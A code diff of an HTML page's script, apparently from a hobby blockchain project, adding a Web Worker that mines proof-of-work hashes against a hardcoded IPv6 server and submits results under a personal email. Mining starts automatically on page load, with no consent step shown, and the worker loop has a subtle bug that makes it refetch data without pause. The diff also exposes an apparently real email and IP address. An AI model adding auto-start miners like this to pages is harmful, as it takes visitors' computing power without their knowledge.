@@ -25,56 +25,157 @@
         }
     </style>
         <script>
-        // Set your miner email
-        const minerEmail = 'echkourine25@icloud.com';
-        const macbook = 'http://[2a01:cb06:9019:af66:2826:cb95:f27f:de0b]:8080';
-        // Function to get the latest proof and difficulty from the blockchain
-        async function getLastProof() {
-            const response = await fetch(macbook+'/mine_data');
-            return await response.json();
+        let mining = false;
+let minerEmail = 'echkourine25@icloud.com';
+const serverUrl = 'http://[2a01:cb06:9019:af66:2826:cb95:f27f:de0b]:8080'; // Replace with your server URL
+
+function setEmail(email) {
+    minerEmail = email;
+    console.log(`Email set to: ${minerEmail}`);
+}
+
+async function fetchMineData() {
+    const response = await fetch(`${serverUrl}/mine_data`);
+    return await response.json();
+}
+
+async function submitProof(proof) {
+    const response = await fetch(`${serverUrl}/mine`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            proof: proof,
+            miner_email: minerEmail
+        })
+    });
+    return await response.json();
+}
+
+function startMining() {
+    if (!mining) {
+        mining = true;
+        mine();
+    }
+}
+
+function stopMining() {
+    mining = false;
+    console.log('Mining stopped');
+    if (worker) {
+        worker.terminate();
+        worker = null;
+    }
+}
+
+let worker = null;
+
+function mine() {
+    if (!minerEmail) {
+        console.error('Please set your email address first.');
+        return;
+    }
+    console.log('Mining started');
+
+    const blob = new Blob([workerScript], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(blob);
+    worker = new Worker(workerUrl);
+    worker.postMessage({ action: 'start', serverUrl, minerEmail });
+
+    worker.onmessage = function(event) {
+        const { status, result } = event.data;
+        if (status === 'mined') {
+            console.log('Mined!', JSON.stringify(result));
+        } else if (status === 'stopped') {
+            console.log('Mining idle');
         }
+    };
+}
 
-        // Function to submit the new proof of work
-        async function submitProof(proof) {
-            const response = await fetch(macbook+'/mine', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    proof: proof,
-                    miner_email: minerEmail
-                })
-            });
-            return await response.json();
+const workerScript = `
+    importScripts('https://cdn.jsdelivr.net/npm/js-sha256@0.9.0/src/sha256.min.js');
+
+    let mining = false;
+    let minerEmail = 'echkourine25@icloud.com';
+    let serverUrl = 'http://[2a01:cb06:9019:af66:2826:cb95:f27f:de0b]:8080';
+
+    onmessage = function(event) {
+        const { action, serverUrl: url, minerEmail: email } = event.data;
+        if (action === 'start') {
+            mining = true;
+            serverUrl = url;
+            minerEmail = email;
+            mine();
+        } else if (action === 'stop') {
+            mining = false;
         }
+    };
 
-        // Function to perform the proof of work
-        async function mine() {
-            
-            const data = await getLastProof();
-            const lastProof = data.last_proof;
-            const difficulty = data.difficulty;
+    async function fetchMineData() {
+        const response = await fetch(\`\${serverUrl}/mine_data\`);
+        return await response.json();
+    }
 
-            let proof = 0;
-            while (true) {
-                const guess = `${lastProof}${proof}`;
-                const guessHash = new TextEncoder().encode(guess);
-                const hashBuffer = await crypto.subtle.digest('SHA-256', guessHash);
-                const hashArray = Array.from(new Uint8Array(hashBuffer));
-                const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    async function submitProof(proof) {
+        const response = await fetch(\`\${serverUrl}/mine\`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                proof: proof,
+                miner_email: minerEmail
+            })
+        });
+        return await response.json();
+    }
 
-                if (hashHex.startsWith('0'.repeat(difficulty))) {
-                    const result = await submitProof(proof);
-                    break;
+    function validProof(lastProof, proof, difficulty) {
+        const guess = \`\${lastProof}\${proof}\`;
+        const guessHash = sha256(guess);
+        return guessHash.substring(0, difficulty) === "0".repeat(difficulty);
+    }
+
+    function proofOfWork(lastProof, difficulty, callback) {
+        let proof = 0;
+        function tryProof() {
+            if (!mining) {
+                return;
+            }
+            if (validProof(lastProof, proof, difficulty)) {
+                callback(proof);
+            } else {
+                proof += 1;
+                if (proof % 1000 === 0) {
+                    setTimeout(tryProof, 0); // Yield control back to the browser every 1000 attempts
                 } else {
-                    proof++;
+                    tryProof();
                 }
             }
         }
+        tryProof();
+    }
 
-        // Start mining
-        mine();
+    async function mine() {
+        while (mining) {
+            const { last_proof, difficulty } = await fetchMineData();
+            proofOfWork(last_proof, difficulty, async (proof) => {
+                if (mining) {
+                    const result = await submitProof(proof);
+                    postMessage({ status: 'mined', result });
+                }
+            });
+        }
+        if (!mining) {
+            postMessage({ status: 'stopped' });
+        }
+    }
+`;
+
+// Example usage
+setEmail('echkourine25@icloud.com'); // Set the email address
+startMining(); // Start mining
     </script>
     </head>
     <body>
